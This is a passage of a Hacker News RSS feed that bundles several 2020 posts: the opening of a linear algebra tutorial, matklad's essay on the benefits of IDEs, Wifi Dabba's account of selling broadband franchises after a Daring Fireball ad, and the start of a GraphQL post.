<p>I’ll do my best to keep notation consistent. Nevertheless, learning to adjust to changing or inconsistent notation is a useful skill, since most authors will use their own preferred notation, and everyone seems to think that its/his/her own notation is better.</p>

<p>To make everything more dynamic and practical, I’ll introduce bits of Python code to exemplify each mathematical operation (when possible) with <code>NumPy</code>, which is the facto standard package for scientific computing in Python.</p>

<p>Finally, keep in mind this is created by a non-mathematician for (mostly) non-mathematicians. I wrote this as if I were talking to myself or a dear friend, which explains why my writing is sometimes conversational and informal.</p>

<p>If you find any mistake in notes feel free to reach me out at pcaceres@wisc.edu and to https://pablocaceres.org/ so I can correct the issue.</p>



<p><strong>Note:</strong> <em>underlined sections</em> are the newest sections and/or corrected ones.</p>

<p><strong><a href="#preliminary-concepts">Preliminary concepts</a></strong>:</p>
<ul>
  <li><a href="#sets">Sets</a></li>
  <li><a href="#belonging-and-inclusion">Belonging and inclusion</a></li>
  <li><a href="#set-specification">Set specification</a></li>
  <li><a href="#ordered-pairs">Ordered pairs</a></li>
  <li><a href="#relations">Relations</a></li>
  <li><a href="#functions">Functions</a></li>
</ul>

<p><strong><a href="#vectors">Vectors</a></strong>:</p>
<ul>
  <li><a href="#types-of-vectors">Types of vectors</a>
    <ul>
      <li><a href="#geometric-vectors">Geometric vectors</a></li>
      <li><a href="#polynomials">Polynomials</a></li>
      <li><a href="#elements-of-r">Elements of R</a></li>
    </ul>
  </li>
  <li><a href="#zero-vector-unit-vector-and-sparse-vector">Zero vector, unit vector, and sparse vector</a></li>
  <li><a href="#vector-dimensions-and-coordinate-system">Vector dimensions and coordinate system</a></li>
  <li><a href="#basic-vector-operations">Basic vector operations</a>
    <ul>
      <li><a href="#vector-vector-addition">Vector-vector addition</a></li>
      <li><a href="#vector-scalar-multiplication">Vector-scalar multiplication</a></li>
      <li><a href="#linear-combinations-of-vectors">Linear combinations of vectors</a></li>
      <li><a href="#vector-vector-multiplication-dot-product">Vector-vector multiplication: dot product</a></li>
    </ul>
  </li>
  <li><a href="#vector-space-span-and-subspace">Vector space, span, and subspace</a>
    <ul>
      <li><a href="#vector-space">Vector space</a></li>
      <li><a href="#vector-span">Vector span</a></li>
      <li><a href="#vector-subspaces">Vector subspaces</a></li>
    </ul>
  </li>
  <li><a href="#linear-dependence-and-independence">Linear dependence and independence</a></li>
  <li><a href="#vector-null-space">Vector null space</a></li>
  <li><a href="#vector-norms">Vector norms</a>
    <ul>
      <li><a href="#euclidean-norm">Euclidean norm: $L_2$</a></li>
      <li><a href="#manhattan-norm">Manhattan norm: $L_1$</a></li>
      <li><a href="#max-norm">Max norm: $L_\infty$</a></li>
    </ul>
  </li>
  <li><a href="#vector-inner-product-length-and-distance">Vector inner product, length, and distance</a></li>
  <li><a href="#vector-angles-and-orthogonality">Vector angles and orthogonality</a></li>
  <li><a href="#systems-of-linear-equations">Systems of linear equations</a></li>
</ul>

<p><strong><a href="#matrices">Matrices</a></strong>:</p>

<ul>
  <li><a href="#basic-matrix-operations">Basic matrix operations</a>
    <ul>
      <li><a href="#matrix-matrix-addition">Matrix-matrix addition</a></li>
      <li><a href="#matrix-scalar-multiplication">Matrix-scalar multiplication</a></li>
      <li><a href="#matrix-vector-multiplication-dot-product">Matrix-vector multiplication: dot product</a></li>
      <li><a href="#matrix-matrix-multiplication">Matrix-matrix multiplication</a></li>
      <li><a href="#matrix-identity">Matrix identity</a></li>
      <li><a href="#matrix-inverse">Matrix inverse</a></li>
      <li><a href="#matrix-transpose">Matrix transpose</a></li>
      <li><a href="#hadamard-product">Hadamard product</a></li>
    </ul>
  </li>
  <li><a href="#special-matrices">Special matrices</a>
    <ul>
      <li><a href="#rectangular-matrix">Rectangular matrix</a></li>
      <li><a href="#square-matrix">Square matrix</a></li>
      <li><a href="#diagonal-matrix">Diagonal matrix</a></li>
      <li><a href="#upper-triangular-matrix">Upper triangular matrix</a></li>
      <li><a href="#lower-triangular-matrix">Lower triangular matrix</a></li>
      <li><a href="#symmetric-matrix">Symmetric matrix</a></li>
      <li><a href="#identity-matrix">Identity matrix</a></li>
      <li><a href="#scalar-matrix">Scalar matrix</a></li>
      <li><a href="#null-or-zero-matrix">Null or zero matrix</a></li>
      <li><a href="#echelon-matrix">Echelon matrix</a></li>
      <li><a href="#antidiagonal-matrix">Antidiagonal matrix</a></li>
      <li><a href="#design-matrix">Design matrix</a></li>
    </ul>
  </li>
  <li><a href="#matrices-as-systems-of-linear-equations">Matrices as systems of linear equations</a></li>
  <li><a href="#the-four-fundamental-matrix-subsapces">The four fundamental matrix subsapces</a>
    <ul>
      <li><a href="#the-column-space">The column space</a></li>
      <li><a href="#the-row-space">The row space</a></li>
      <li><a href="#the-null-space">The null space</a></li>
      <li><a href="#the-null-space-of-the-transpose">The null space of the transpose</a></li>
    </ul>
  </li>
  <li><a href="#solving-systems-of-linear-equations-with-matrices">Solving systems of linear equations with matrices</a>
    <ul>
      <li><a href="#gaussian-elimination">Gaussian Elimination</a></li>
      <li><a href="#gauss-jordan-elimination">Gauss-Jordan Elimination</a></li>
    </ul>
  </li>
  <li><a href="#matrix-basis-and-rank">Matrix basis and rank</a></li>
  <li><a href="#matrix-norm">Matrix norm</a></li>
</ul>

<p><strong><a href="#linear-and-affine-mappings">Linear and affine mappings</a></strong>:</p>

<ul>
  <li><a href="#linear-mappings">Linear mappings</a></li>
  <li><a href="#examples-of-linear-mappings">Examples of linear mappings</a>
    <ul>
      <li><a href="#negation-matrix">Negation matrix</a></li>
      <li><a href="#reversal-matrix">Reversal matrix</a></li>
    </ul>
  </li>
  <li><a href="#examples-of-nonlinear-mappings">Examples of nonlinear mappings</a>
    <ul>
      <li><a href="#norms">Norms</a></li>
      <li><a href="#translation">Translation</a></li>
    </ul>
  </li>
  <li><a href="#affine-mappings">Affine mappings</a>
    <ul>
      <li><a href="#affine-combination-of-vectors">Affine combination of vectors</a></li>
      <li><a href="#affine-span">Affine span</a></li>
      <li><a href="#affine-space-and-subspace">Affine space and subspace</a></li>
      <li><a href="#affine-mappings-using-the-augmented-matrix">Affine mappings using the augmented matrix</a></li>
    </ul>
  </li>
  <li><a href="#special-linear-mappings">Special linear mappings</a>
    <ul>
      <li><a href="#scaling">Scaling</a></li>
      <li><a href="#reflection">Reflection</a></li>
      <li><a href="#shear">Shear</a></li>
      <li><a href="#rotation">Rotation</a></li>
    </ul>
  </li>
  <li><a href="#projections">Projections</a>
    <ul>
      <li><a href="#projections-onto-lines">Projections onto lines</a></li>
      <li><a href="#projections-onto-general-subspaces">Projections onto general subspaces</a></li>
      <li><a href="#projections-as-approximate-solutions-to-systems-of-linear-equations">Projections as approximate solutions to systems of linear equations</a></li>
    </ul>
  </li>
</ul>

<p><strong><a href="#matrix-decompositions">Matrix decompositions</a></strong>:</p>
<ul>
  <li><a href="#lu-decomposition">LU decomposition</a>
    <ul>
      <li><a href="#elementary-matrices">Elementary matrices</a></li>
      <li><a href="#the-inverse-of-elementary-matrices">The inverse of elementary matrices</a></li>
      <li><a href="#lu-decomposition-as-gaussian-elimination">LU decomposition as Gaussian Elimination</a></li>
      <li><a href="#lu-decomposition-with-pivoting">LU decomposition with pivoting</a></li>
    </ul>
  </li>
  <li><a href="#qr-decomposition">QR decomposition</a>
    <ul>
      <li><a href="#orthonormal-basis">Orthonormal basis</a></li>
      <li><a href="#orthonormal-basis-transpose">Orthonormal basis transpose</a></li>
      <li><a href="#gram-schmidt-orthogonalization">Gram-Schmidt Orthogonalization </a></li>
      <li><a href="#qr-decomposition-as-gram-schmidt-orthogonalization">QR decomposition as Gram-Schmidt Orthogonalization</a></li>
    </ul>
  </li>
  <li><a href="#determinant">Determinant</a>
    <ul>
      <li><a href="#determinant-as-measures-of-volume">Determinant as measures of volume</a></li>
      <li><a href="#the-2-x-2-determinant">The 2X2 determinant</a></li>
      <li><a href="#the-n-x-n-determinant">The NXN determinant</a></li>
      <li><a href="#determinants-as-scaling-factors">Determinants as scaling factors</a></li>
      <li><a href="#the-importance-of-determinants">The importance of determinants</a></li>
    </ul>
  </li>
  <li><a href="#eigenthings">Eigenthings</a>
    <ul>
      <li><a href="#change-of-basis">Change of basis</a></li>
      <li><a href="#eigenvectors-eigenvalues-and-eigenspaces">Eigenvectors, Eigenvalues, and Eigenspaces</a></li>
      <li><a href="#trace-and-determinant-with-eigenvalues">Trace and determinant with eigenvalues</a></li>
      <li><a href="#eigendecomposition">Eigendecomposition</a></li>
      <li><a href="#eigenbasis-are-a-good-basis">Eigenbasis are a good basis</a></li>
      <li><a href="#geometric-interpretation-of-eigendecomposition">Geometric interpretation of Eigendecomposition</a></li>
      <li><a href="#the-problem-with-eigendecomposition">The problem with Eigendecomposition</a></li>
    </ul>
  </li>
  <li><a href="#singular-value-decomposition">Singular Value Decomposition</a>:
    <ul>
      <li><a href="#singular-value-decomposition-theorem">Singular Value Decomposition Theorem</a></li>
      <li><a href="#singular-value-decomposition-computation">Singular Value Decomposition computation</a></li>
      <li><a href="#geometric-interpretation-of-the-singular-value-decomposition">Geometric interpretation of the Singular Value Decomposition</a></li>
      <li><a href="#singular-value-decomposition-vs-eigendecomposition">Singular Value Decomposition vs Eigendecomposition</a></li>
    </ul>
  </li>
  <li><a href="#matrix-approximation">Matrix Approximation</a>:
    <ul>
      <li><a href="#best-rank-k-approximation-with-svd">Best rank-k approximation with SVD</a></li>
      <li><a href="#best-low-rank-approximation-as-a-minimization-problem">Best low-rank approximation as a minimization problem</a></li>
    </ul>
  </li>
</ul>

<p><strong><a href="#epilogue">Epilogue</a></strong></p>



<p>While writing about linear mappings, I realized the importance of having a basic understanding of a few concepts before approaching the study of linear algebra. If you are like me, you may not have formal mathematical training beyond high school. If so, I encourage you to read this section and spent some time wrapping your head around these concepts before going over the linear algebra content (otherwise, you might prefer to skip this part). I believe that reviewing these concepts is of great help to understand the <em>notation</em>, which in my experience is one of the main barriers to understand mathematics for nonmathematicians: we are <em>non</em>native speakers, so we are continuously building up our vocabulary. I’ll keep this section very short, as is not the focus of this mini-course.</p>

<p>For this section, my notes are based on readings of:</p>

<ul>
  <li><strong>Geometric transformations (Vol. 1)</strong> (1966) by Modenov &amp; Parkhomenko</li>
  <li><strong>Naive Set Theory</strong> (1960) by P.R. Halmos</li>
  <li><strong>Abstract Algebra: Theory and Applications</strong> (2016) by Judson &amp; Beeer. <a href="http://abstract.pugetsound.edu/download/aata-20160809.pdf">Book link</a></li>
</ul>

<h2 id="sets">Sets</h2>

<p>Sets are one of the most fundamental concepts in mathematics. They are so fundamental that they are not defined in terms of anything else. On the contrary, other branches of mathematics are defined in terms of sets, including linear algebra. Put simply, <strong>sets are well-defined collections of objects</strong>. Such objects are called <strong>elements or members</strong> of the set. The crew of a ship, a caravan of camels, and the LA Lakers roster, are all examples of sets. The captain of the ship, the first camel in the caravan, and LeBron James are all examples of “members” or “elements” of their corresponding sets. We denote a set with an upper case italic letter as $\textit{A}$. In the context of linear algebra, we say that a line is a set of points, and the set of all lines in the plane is a set of sets. Similarly, we can say that <em>vectors</em> are sets of points, and <em>matrices</em> sets of vectors.</p>

<h2 id="belonging-and-inclusion">Belonging and inclusion</h2>

<p>We build sets using the notion of <strong>belonging</strong>. We denote that $a$ <em>belongs</em> (or is an <em>element</em> or <em>member</em> of) to $\textit{A}$ with the Greek letter epsilon as:</p>



<p>Another important idea is <strong>inclusion</strong>, which allow us to build <em>subsets</em>. Consider sets $\textit{A}$ and $\textit{B}$. When every element of $\textit{A}$ is an element of $\textit{B}$, we say that $\textit{A}$ is a <em>subset</em> of $\textit{B}$, or that $\textit{B}$ <em>includes</em> $\textit{A}$. The notation is:</p>



<p>or</p>



<p>Belonging and inclusion are derived from <strong>axion of extension</strong>: <em>two sets are equal if and only if they have the same elements</em>. This axiom may sound trivially obvious but is necessary to make belonging and …</p></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pabloinsente.github.io/intro-linear-algebra">https://pabloinsente.github.io/intro-linear-algebra</a></em></p>]]>
            </description>
            <link>https://pabloinsente.github.io/intro-linear-algebra</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058619</guid>
            <pubDate>Wed, 11 Nov 2020 14:24:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What mother never told you about VM service (1983) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25058543">thread link</a>) | @fanf2
<br/>
November 11, 2020 | http://www.leeandmelindavarian.com/Melinda/tutorial.pdf | <a href="https://web.archive.org/web/*/http://www.leeandmelindavarian.com/Melinda/tutorial.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.leeandmelindavarian.com/Melinda/tutorial.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058543</guid>
            <pubDate>Wed, 11 Nov 2020 14:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an IDE?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058502">thread link</a>) | @todsacerdoti
<br/>
November 11, 2020 | https://matklad.github.io//2020/11/11/yde.html | <a href="https://web.archive.org/web/*/https://matklad.github.io//2020/11/11/yde.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io//2020/11/11/yde.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058502</guid>
            <pubDate>Wed, 11 Nov 2020 14:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$200k in sales from a $6k advertisement]]>
            </title>
            <description>
<![CDATA[
Score 383 | Comments 104 (<a href="https://news.ycombinator.com/item?id=25058363">thread link</a>) | @mildlyclassic
<br/>
November 11, 2020 | https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad | <a href="https://web.archive.org/web/*/https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <div>
        <div>
          <div>


          
            <table>
                <thead>
                  <tr>
                    <th>
                      Metric
                    </th>
                    <th>
                      Count
                    </th>
                  </tr>
                </thead>
                <tbody>
                <tr data-href="#!">
                    <td>
                      Time period
                    </td>
                    <td>
                      Aug 17,2020 - Aug 24,2020
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Visitors
                    </td>
                    <td>
                      7,200
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Emails
                    </td>
                    <td>
                      45
                    </td>
                    
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Video calls
                    </td>
                    <td>
                      30
                    </td>
                    
                  </tr>
                  <tr data-href="#!">
                    <td>
                      <strong>Units sold</strong>
                    </td>
                    <td>
                      <b>10</b>
                    </td>
                  </tr>   
                  <tr data-href="#!">
                    <td>
                      <strong>Unit price</strong>
                    </td>
                    <td>
                      <b>$20,000</b>
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      <strong>Total revenue from DF</strong>
                    </td>
                    <td>
                      <b>$200,000</b>
                    </td>
                  </tr>
                  
                </tbody>
              </table>
              
              
          <ul>
              <li>
                Build cheap broadband distribution technology.
              </li>
              <li>
                Prove the tech works by connecting 1M people in one city.
              </li>
              <li>
                Deploy across 1,000 cities in India
              </li>
            </ul>

            

            <p>
                Our goal at <a href="https://www.wifidabba.com/">Wifi Dabba</a> is to lower the cost of broadband access in India. We use lasers instead of underground fiber as our core network and commodity components to dramatically lower the cost of deploying a broadband network.
            
                We've been running a beta network in Bengaluru, India for the last 9 months serving thousands of live customers. We're now ready to deploy a city wide network and provide cheap internet access to a million people.
            </p>

            <iframe width="100%" height="450" src="https://www.youtube.com/embed/LwVWJXBNQg8?autoplay=1" srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/LwVWJXBNQg8?autoplay=1><img width='100%' style='min-height:250px;' src='https://img.youtube.com/vi/LwVWJXBNQg8/hqdefault.jpg' alt='Wifi Dabba overview'><span>▶</span></a>" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="Wifi Dabba overview"></iframe>

            
            <p>
              A core tenet of the Wifi Dabba network is distributed ownership. We believe that ownership of the internet should be in the hands of as many people as possible. If the cost of broadband tech drops, then more people can help pay for the cost of the network.
              And if you're one of the people paying for the distribution, we believe you should get revenue in return.
            </p>

            <p>
              We've divided the city of Bengaluru into 100 regions called PoPs. Anyone can buy a region and get a share in the revenue from those subscribers. 
            </p>

            <p>
              The Wifi Dabba franchise model:
            </p>

            <ul>
              <li>
                <strong>$20,000</strong> to purchase a 4sqkm. PoP.
              </li>
              <li>
                <strong>Minimum guaranteed revenue</strong> Paid quarterly with a 6 year rev share agreement.
              </li>
              <li>
                <strong>Fully managed service</strong> Be an absentee landlord
              </li>
            </ul>

            

            <p>
              <span>We've sold 40 as of the time of writing this.</span>
              <br>
              
              Wifi Dabba is insanely lucky for the amount of public support we have as a company. We regularly get phone calls, emails and even people dropping by our office just to tell us they like our service. Over the last 3 years we've received dozens of emails from people requesting franchises or other types of partnerships.
              We're incredibly humbled and thankful for this support on a daily basis.
            </p>

            
            <p>
              We believe there is a large group of people that care about the future of the internet and would be willing to put their money where their mouths are. As long as the price and the level of risk involved is reasonable.
              Our gut told us that this group would most likely be people that have seen success in the technology business as engineers, operators and entreprenuers.
            </p>

            
            <p>
              We've had our heads down over the last three years building and testing our network stack. Publicity or notariety has never been high on our list. 
              We've begun ramping up our social media efforts but it was clear that to kickstart our outreach, we had to do a little bit of advertising.
            </p>

            
            
              <p><img src="https://www.wifidabba.com/images/df-venn.png" height="300" width="330" alt="...">
                <br>
              </p>
            <p>
              <a href="https://www.daringfireball.net/">Daringfireball.net</a> is a great blog authored by <a href="https://en.wikipedia.org/wiki/John_Gruber">John Gruber</a> who is also the creator of <a href="https://daringfireball.net/projects/markdown/">Markdown</a>.
              DF was a natural choice for us as we've been readers of the blog for a long while and we knew from experience that DF readers would fit our target market rather well. Given the high quality of John's writing and insights into the industry, we felt that there would be a large pool of senior tech veterans that would be interested in Wifi Dabba among DF's audience.
            </p>

            <p>
                The sponsorship cost us $6,500 and ran for the week starting Aug 17, 2020 and we got:
                </p><ul>
                <li>
                  A display ad in the sidebar on every page of the site, all week long.
                </li>
                <li>
                  A post from the sponsor in the RSS feed at the start of the week. Us, the sponsor, got to address Daring Fireball’s most dedicated readers directly.
                </li>
                <li>
                  At the end of the week, John also posts an item thanking and linking to the feed sponsor.
                </li>
              </ul>
            

            <p>
                Stats about DF readership
                </p><ul>
                <li>
                Typical weekday web page views: 80,000–100,000.
                </li>
                <li>
                Estimated monthly web page views: 2.5 million.
                </li>
                <li>
                Estimated Daring Fireball RSS feed subscribers: Over 200,000.
                </li>
                <li>
                Twitter followers on the @daringfireball  account: Over 92,000.
                </li>
              </ul>
            
            

            
            <p>
                We created two variants of our message. Designed in bold colours to stand out against DF's dark theme. These creatives rotated randomly.
                We decided to focus on the technology because of the nature of the audience and hoped that the website did a good job of explaining the product.  
                </p><p><img src="https://www.wifidabba.com/images/df-ads.png" width="100%" alt="Buy internet POP">
                </p>
            

            
            <div>
                <p><strong>Click Ad -&gt; Browse site -&gt; Setup a call</strong></p><p>

                We expected visitors to click on the ad in DF and land on our homepage. Once on our site, we hoped that visitors would check out our videos as well as browse through a few pages.
                If they liked what they saw, we had a prominent buy button on the front page which led to a page to setup a video call.
            </p></div>

            <p>
                It's worth noting here that we knew going in that a large percentage of DF's audience would be using Ad-blockers. Nothing wrong with that, we use ad-blockers ourselves.
            </p>

            <p>
              Furthermore, we made a deliberate choice to add a high friction call to action and contact process. In order to purchase a PoP, a visitor would be directed to a calendar managed by calendly that would help them setup a call with someone from our team at a convenient time.
            </p>
            <p><a href="https://wifidabba.com/buy">
              <img width="100%" src="https://www.wifidabba.com/images/df-buy.png" alt="Setup Call">
            </a></p><p>
              The reason for this is that we knew DF would deliver a few hundred visitors a day to our site. We're a small team and our core focus is deploying the network, not necessarily sales and our goal is to sell the PoPs to people that are really excited a lot about our idea and show a high level of interest.
              The $20,000 price point of our product + the high friction of the contact process + users that are OK with ads = A high signal to noise ratio from DF visitors. 
              We'd love to hear any feedback on what you think about this.
            </p>

            
              

              <p>
                Our thesis turned out to be pretty spot on. Senior engineers from Google, Apple and a host of other technology companies purchased the PoPs.
                The actual sales process turned out to be fairly quick and straight forward. Most of the people that purchased the PoPs did so within a period of 48 hours of having the call.
              </p>

              



          </div>
        </div>
    </div>
    </section></div>]]>
            </description>
            <link>https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058363</guid>
            <pubDate>Wed, 11 Nov 2020 13:51:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Executing GraphQL Queries]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058361">thread link</a>) | @chmaynard
<br/>
November 11, 2020 | https://jemma.dev/blog/executing-graphql-queries | <a href="https://web.archive.org/web/*/https://jemma.dev/blog/executing-graphql-queries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><a href="https://graphql.org/">GraphQL</a> is surging in popularity as a preferred choice for APIs over REST APIs. One of the reasons many companies cite for converting their APIs from REST to GraphQL is its ease of use. If you know JSON, GraphQL is incredibly intuitive. And there are helpful tools like <a href="https://github.com/graphql/graphiql">GraphiQL</a>, an in browser GraphQL IDE.</p>

